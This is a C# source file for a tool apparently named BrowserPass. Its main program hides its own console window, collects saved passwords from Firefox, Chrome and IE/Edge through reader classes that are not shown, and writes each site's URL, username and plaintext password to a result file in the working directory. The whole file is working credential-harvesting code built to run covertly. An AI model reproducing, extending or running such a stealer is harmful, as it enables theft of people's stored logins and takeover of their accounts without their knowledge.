using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;


/**
 * 
 *  Author: jabiel - Jarek Bielicki
 *  Author: NoStudioDude - Rui Nunes
 * 
 *  Improvements by InheritedDamage
 * 
 **/


namespace BrowserPass
{
    // Missing windows.security? https://software.intel.com/en-us/articles/using-winrt-apis-from-desktop-applications
    // or check path to Windows.winmd in csproj file
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);

            using (StreamWriter sw = new StreamWriter(String.Concat(Directory.GetCurrentDirectory(), @"\\log.txt"), true)) {
                List<IPassReader> readers = new List<IPassReader>();
                sw.WriteLine("Retrieving Firefox passwords ...");
                readers.Add(new FirefoxPassReader());
                sw.WriteLine("Retrieving Chrome passwords ...");
                readers.Add(new ChromePassReader());
                sw.WriteLine("Retrieving IE10/Edge passwords ...");
                readers.Add(new IE10PassReader());

                sw.WriteLine("Create result file ...");
                String filePath = CreateNewResFileWithDate();
                sw.WriteLine($"result file name: {filePath}");

                foreach (var reader in readers)
                {
                    sw.WriteLine($"writing {reader.BrowserName} passwords to result file ...");
                    try
                    {
                        WriteCredentials(reader.ReadPasswords(), filePath);
                    }
                    catch (Exception ex)
                    {
                        sw.WriteLine($"ERROR reading {reader.BrowserName} passwords: " + ex.Message);
                    }
                }
                sw.WriteLine("done\r\n");
            }

#if DEBUG
            Console.ReadLine();
#endif
            System.Environment.Exit(0);
        }

        static void PrintCredentials(IEnumerable<CredentialModel> data)
        {
            foreach (var d in data)
                Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
        }

        static void WriteCredentials(IEnumerable<CredentialModel> data, String resFilePath) {
            String path = Directory.GetCurrentDirectory();
            using (StreamWriter sw = File.AppendText(resFilePath))
            {
                foreach (var d in data)
                    sw.WriteLine($"{d.Url}\r\nuser= {d.Username}\r\npass= {d.Password}\r\n");
                sw.Close();
            }
        }

        static String GetCurrentDate() {
            DateTime localDate = DateTime.Now;
            return localDate.ToString("MMM yyyy");
        }

        static String CreateNewResFileWithDate() {
            String path = Directory.GetCurrentDirectory();
            int i = 1;
            String fileprefix = "\\result_";
            String filesuffix = ".txt";
            while (File.Exists(String.Concat(path, fileprefix, i.ToString(), filesuffix)))
                i++;
            String filepath = String.Concat(path, fileprefix, i.ToString(), filesuffix);

            using (StreamWriter sw =
            new StreamWriter(filepath, true)) {
                sw.WriteLine($"{GetCurrentDate()}\r\n");
                sw.Close();
            }

            return filepath;
        }
    }
}
